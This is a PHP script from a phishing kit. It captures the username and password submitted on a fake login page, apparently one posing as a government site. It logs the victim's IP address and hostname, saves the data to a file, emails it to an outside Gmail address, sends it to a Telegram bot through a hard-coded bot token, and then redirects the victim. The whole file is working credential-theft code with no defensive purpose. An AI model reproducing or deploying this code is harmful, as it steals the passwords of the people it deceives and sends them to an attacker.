<?php



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$msg="|+ log gov()\r\n";
$msg.="==================================================\r\n";
$msg .= "username :   ".@$_POST["username"]."\n";
$msg .= "password :   ".@$_POST["password"]."\n";
$msg.="==============================\r\n";
$msg.="[+] localIP : ".@$ip."\n";
$msg .= "|date : :   ".gmdate ("Y-n-d")."@".gmdate ("H:i:s")."\n";
$msg .= "|HostName : :   ".@$hostname."\n";
$msg.="\r\n";
$msg.="\r\n";
$save=fopen("../nok.txt","a+");fwrite($save,$msg);fclose($save);
$email="cmnkul@gmail.com"; //HERE
$subject="log =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
$headers="From: dr<comms@dioury.casa>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$msg,$headers);
file_get_contents('https://api.telegram.org/bot6571406193:AAFXuvB6-Y1wzSD7sfMuXf6x4HKE3FNmhr8/sendMessage?chat_id=979803173&text='.urlencode($msg));

header("Location: load.php?id=1");
?>